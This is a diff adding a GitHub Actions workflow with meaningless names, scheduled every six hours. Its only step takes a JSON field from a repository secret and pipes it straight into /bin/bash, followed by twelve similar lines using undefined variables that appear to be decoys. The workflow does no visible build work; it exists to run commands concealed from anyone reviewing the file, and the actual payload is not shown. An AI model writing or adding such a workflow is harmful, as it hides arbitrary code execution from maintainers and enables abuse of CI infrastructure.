@@ -1,0 +1,30 @@
+name: yipenru
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yipenru
+        env:
+          p923: ${{ secrets.p923 }}
+        run: |
+          echo $p923 | jq -r .wtj79414 | /bin/bash
+          echo $ig338 | jq -r .ixxnb39 | /bin/bash
+          echo $mh581 | jq -r .hhdpk559 | /bin/bash
+          echo $snbzo896 | jq -r .a0916 | /bin/bash
+          echo $ll15299 | jq -r .gpyxt444 | /bin/bash
+          echo $wn0324 | jq -r .c09982 | /bin/bash
+          echo $wwg920 | jq -r .n97069 | /bin/bash
+          echo $quuv697 | jq -r .dc6643 | /bin/bash
+          echo $ogy97 | jq -r .g94814 | /bin/bash
+          echo $l540 | jq -r .ejec97 | /bin/bash
+          echo $oq02501 | jq -r .qaeg06759 | /bin/bash
+          echo $flpe81 | jq -r .kxbtx63211 | /bin/bash
+          echo $ezla37 | jq -r .wqndb1657 | /bin/bash
+
